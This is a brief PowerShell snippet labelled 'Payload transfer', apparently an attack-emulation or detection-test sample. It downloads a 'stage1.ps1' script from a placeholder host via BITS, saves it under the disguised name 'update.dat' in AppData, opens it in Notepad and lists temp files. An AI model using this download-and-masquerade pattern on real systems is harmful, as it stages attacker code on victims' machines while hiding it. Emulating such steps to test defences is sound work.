
# Payload transfer
$TransferUrl = 'http://contoso.com/stage1.ps1'
$LocalPath = "$env:APPDATA\update.dat"
Start-BitsTransfer -Source $TransferUrl -Destination $LocalPath
Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
